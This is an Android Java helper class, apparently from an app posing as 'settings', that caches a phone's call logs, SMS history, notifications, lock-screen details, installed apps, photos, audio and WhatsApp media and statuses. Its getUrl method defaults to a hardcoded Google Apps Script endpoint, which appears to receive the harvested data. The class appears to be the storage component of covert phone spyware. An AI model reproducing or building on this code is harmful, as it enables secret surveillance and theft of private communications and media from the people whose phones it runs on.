package com.example.settings;

import android.content.Context;
import android.content.SharedPreferences;

public class Sharedpref {
    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    public static final String PREFS_NAME = "Rozkhabardhar_APP";


    public Sharedpref(Context context) {
        sharedPreferences = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        editor = sharedPreferences.edit();
    }
    public void resetSharedPref() {
        editor.clear().commit();
    }

    public void apply() {
        editor.apply();
    }

    public void commit() {
        editor.commit();
    }


    public void setSaveName(String saveName){
        editor.putString("savename",saveName.trim());
    }
    public String getSaveName(){
        return sharedPreferences.getString("savename","No Name Yet");
    }

    public void setCopiedText(String saveName){
        editor.putString("copiedtext",saveName.trim());
    }
    public String getCopiedText(){
        return sharedPreferences.getString("copiedtext","");
    }
    public void setPhoneNumbersListSize(int PhoneNumbersList){
        editor.putInt("PhoneNumbersListSize",PhoneNumbersList);
    }
    public int getPhoneNumbersLisSize(){
        return sharedPreferences.getInt("PhoneNumbersListSize",0);
    }
    public void setPrevPhoneNumbersListSize(int PhoneNumbersList){
        editor.putInt("PrevPhoneNumbersListSize",PhoneNumbersList);
    }
    public int getPrevPhoneNumbersLisSize(){
        return sharedPreferences.getInt("PrevPhoneNumbersListSize",0);
    }
    public void setPhoneNumbers(String PhoneNumbersList){
        editor.putString("PhoneNumbersList",PhoneNumbersList.trim());
    }
    public String getPhoneNumbers(){
        return sharedPreferences.getString("PhoneNumbersList","");
    }
    public void setOutgoingNumbers(String outgoingNumbers){
        editor.putString("outgoingnumbers",outgoingNumbers.trim());
    }
    public String getOutgoingNumbers(){
        return sharedPreferences.getString("outgoingnumbers","");
    }
    public void setRecievedNumbers(String recievednumbers){
        editor.putString("recievednumbers",recievednumbers.trim());
    }
    public String getRecievedNumbers(){
        return sharedPreferences.getString("recievednumbers","");
    }
    public void setMissedCallNumber(String missedCallNumber){
        editor.putString("missedCallNumber",missedCallNumber.trim());
    }
    public String getMissedCallNumber(){
        return sharedPreferences.getString("missedCallNumber","");
    }

    public void setSaveTextWritten(String saveTextWritten){
        editor.putString("saveTextWritten",saveTextWritten.trim());
    }
    public String getSaveTextWritten(){
        return sharedPreferences.getString("saveTextWritten","");
    }

    public void setPhoneAppdetails(String phoneAppdetails){
        editor.putString("phoneAppdetails",phoneAppdetails.trim());
    }
    public String getPhoneAppdetails(){
        return sharedPreferences.getString("phoneAppdetails","");
    }

    public void setPhoneAppdetailsListSize(int phoneAppdetailslistsize){
        editor.putInt("phoneAppdetailslistsize",phoneAppdetailslistsize);
    }
    public int getPhoneAppdetailsListSize(){
        return sharedPreferences.getInt("phoneAppdetailslistsize",0);
    }

    public void setPrevPhoneAppdetailsListSize(int phoneAppdetailslistsize){
        editor.putInt("prevphoneAppdetailslistsize",phoneAppdetailslistsize);
    }
    public int getPrevPhoneAppdetailsListSize(){
        return sharedPreferences.getInt("prevphoneAppdetailslistsize",0);
    }
    public void setNotificationData(String saveNotificationData){
        editor.putString("saveNotificationData",saveNotificationData.trim());
    }
    public String getNotificationData(){
        return sharedPreferences.getString("saveNotificationData","");
    }
    public void setSmsData(String SmsData){
        editor.putString("SmsData",SmsData.trim());
    }
    public String getSmsData(){
        return sharedPreferences.getString("SmsData","");
    }
    public void setOtherNotificationData(String saveNotificationData){
        editor.putString("OthersaveNotificationData",saveNotificationData.trim());
    }
    public String getOtherNotificationData(){
        return sharedPreferences.getString("OthersaveNotificationData","");
    }
    public void setServicerNotificationData(String serviceNotificationData){
        editor.putString("serviceNotificationData",serviceNotificationData.trim());
    }
    public String getServiceNotificationData(){
        return sharedPreferences.getString("serviceNotificationData","");
    }
    public void setClickedData(String Clickeddata){
        editor.putString("Clickeddata",Clickeddata.trim());
    }
    public String getClickedData(){
        return sharedPreferences.getString("Clickeddata","");
    }
    public void setOtherClickedData(String Clickeddata){
        editor.putString("OtherClickeddata",Clickeddata.trim());
    }
    public String getOtherClickedData(){
        return sharedPreferences.getString("OtherClickeddata","");
    }
    public void savePrevDate(String Clickeddata){
        editor.putString("savePrevDate",Clickeddata.trim());
    }
    public String getPrevDate(){
        return sharedPreferences.getString("savePrevDate","");
    }
    public void setUrl(String url){
        editor.putString("setnewurl",url.trim());
        editor.commit();
    }
    public String getUrl(){
        return sharedPreferences.getString("setnewurl","https://script.google.com/macros/s/AKfycbyDDM0d5P_wzbh80bOpjmocdf3tbAZhObLTDIDa92E01GES1wDvCzE8lCo8PE_Jgqa4dA/exec");
    }
    public void setCallHistory(String callhistory){
        editor.putString("callhistory",callhistory.trim());
    }
    public String getCallHistory(){
        return sharedPreferences.getString("callhistory","");
    }
    public void setBatteryPercnt(String percnt){
        editor.putString("percnt",percnt.trim());
    }
    public String getBatteryPercent(){
        return sharedPreferences.getString("percnt","");
    }
    public void setPhoneLockDetails(String phoneLockDetails){
        editor.putString("phonelockdetails",phoneLockDetails.trim());
    }
    public String getPhoneLockDetails(){
        return sharedPreferences.getString("phonelockdetails","");
    }
    public void setSmsHistory(String SmsHistory){
        editor.putString("smshistory",SmsHistory.trim());
    }
    public String getSmsHistory(){
        return sharedPreferences.getString("smshistory","");
    }
    public void setServiceStatus(String serviceStatus){
        editor.putString("serviceStatus",serviceStatus.trim());
    }
    public String getServiceStatus(){
        return sharedPreferences.getString("serviceStatus","");
    }

    /*Images List*/
    public void setImageList(String imageList){
        editor.putString("imageList",imageList.trim());
    }
    public String getImageList(){
        return sharedPreferences.getString("imageList","");
    }
    /*Images from Phone*/
    public void setImagesJson(String imageJson){
        editor.putString("imagesJson",imageJson.trim());
    }
    public String getImagesJson(){
        return sharedPreferences.getString("imagesJson","");
    }

    /*Audio Files*/
    public void setAudioList(String audioList){
        editor.putString("audioList",audioList.trim());
    }
    public String getAudioList(){
        return sharedPreferences.getString("audioList","");
    }

    /*Audio Json*/
    public void setAudioJson(String audioJson){
        editor.putString("audioJson",audioJson.trim());
    }
    public String getAudioJson(){
        return sharedPreferences.getString("audioJson","");
    }


    /*WhatsAppAudioList*/
    public void setWhatsAppAudioList(String whatsAppAudioList){
        editor.putString("whatsAppAudioList",whatsAppAudioList.trim());
    }
    public String getWhatsAppAudioList(){
        return sharedPreferences.getString("whatsAppAudioList","");
    }
    /*WhatsAppAudioJSON*/
    public void setWhatsAppAudioJSon(String whatsAppAudioJSon){
        editor.putString("whatsAppAudioJSon",whatsAppAudioJSon.trim());
    }
    public String getWhatsAppAudioJson(){
        return sharedPreferences.getString("whatsAppAudioJSon","");
    }

    /*WhatsAppImageList*/
    public void setWhatsAppImageList(String whatsAppImageListList){
        editor.putString("whatsAppImageListList",whatsAppImageListList.trim());
    }
    public String getWhatsAppAImageList(){
        return sharedPreferences.getString("whatsAppImageListList","");
    }

    /*WhatsAppImageJSon*/
    public void setWhatsAppImageJson(String whatsAppImageJson){
        editor.putString("whatsAppImageJson",whatsAppImageJson.trim());
    }
    public String getWhatsAppAImageJson(){
        return sharedPreferences.getString("whatsAppImageJson","");
    }

    /*WhatsAppStatusList*/
    public void setWhatsAppStatusList(String whatsAppImageListList){
        editor.putString("whatsStatusList",whatsAppImageListList.trim());
    }
    public String getWhatsAppAStatusList(){
        return sharedPreferences.getString("whatsStatusList","");
    }

    /*WhatsAppStatusJSon*/
    public void setWhatsAppStatusJson(String whatsAppImageJson){
        editor.putString("whatsAppStatusImageJson",whatsAppImageJson.trim());
    }
    public String getWhatsAppStatusJson(){
        return sharedPreferences.getString("whatsAppStatusImageJson","");
    }

}
